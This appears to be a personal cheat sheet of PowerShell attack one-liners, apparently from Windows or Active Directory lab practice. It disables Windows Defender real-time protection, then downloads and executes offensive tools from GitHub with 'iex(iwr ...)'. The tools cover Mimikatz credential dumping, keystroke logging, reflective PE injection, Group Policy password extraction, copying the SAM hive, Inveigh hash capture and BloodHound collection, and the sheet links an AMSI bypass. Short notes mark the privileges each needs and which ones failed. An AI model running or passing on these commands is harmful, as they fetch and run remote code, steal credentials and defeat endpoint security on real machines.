Set-MPPreference -DisableRealtimeMonitoring $true

# admin privs required
iex( iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1 -usebasicparsing)
Invoke-Mimikatz

# user context ok
iex (iwr https://raw.githubusercontent.com/clr2of8/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1)
Get-Keystrokes
cat $env:temp\key.log

# problems: broke
iex( iwr https://raw.githubusercontent.com/clr2of8/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1 -usebasicparsing)
https://github.com/PowerShellMafia/PowerSploit/blob/c722f89a29fe81b2e554de3b03101794e4ad6aaa/CodeExecution/Invoke-ReflectivePEInjection.ps1
* also broke
$PEBytes = Get-Content C:\Windows\System32\notepad.exe -Encoding Byte -Raw
Invoke-ReflectivePEInjection -PEBytes $PEBytes -FuncReturnType WString

# user context ok
# requires AD Domain
iex( iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1 -usebasicparsing)

# admin privs required
iex( iwr https://raw.githubusercontent.com/clr2of8/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1 -usebasicparsing)
Invoke-NinjaCopy -path C:\Windows\System32\config\SAM -LocalDestination $env:Temp\sam

# user context ok
iex( iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1 -usebasicparsing)
Invoke-AllChecks

# user context ok
iex( iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -usebasicparsing)
Get-NetLocalGroupMember

# admin privs required
# requires AD Domain to capture hashes
iex( iwr https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1 -usebasicparsing)
Invoke-Inveigh

# user context ok
# requires AD Domain
iex( iwr https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.ps1 -usebasicparsing)
Invoke-BloodHound

# user context ok
https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell (Copy First Method: Patch the providers DLL)
Set-MPPreference -DisableRealtimeMonitoring $false
#Invoke-Mimikatz
